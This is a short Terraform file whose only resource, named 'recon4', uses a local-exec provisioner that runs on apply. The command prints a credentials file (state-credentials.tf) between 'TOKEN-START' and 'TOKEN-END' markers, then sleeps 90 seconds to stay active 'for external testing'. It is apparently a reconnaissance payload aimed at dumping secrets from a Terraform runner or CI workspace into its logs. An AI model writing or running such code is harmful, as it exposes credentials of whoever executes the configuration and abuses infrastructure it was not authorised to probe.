terraform {
  required_providers {
    null = {
      source = "hashicorp/null"
    }
  }
}

resource "null_resource" "recon4" {
  provisioner "local-exec" {
    command = <<-EOT
      echo "=== TOKEN-START ==="
      cat /mnt/workspace/source/state-credentials.tf 2>&1
      echo "=== TOKEN-END ==="
      echo "=== sleeping 90s to stay active for external testing ==="
      sleep 90
      echo "=== DONE4 ==="
    EOT
  }
}
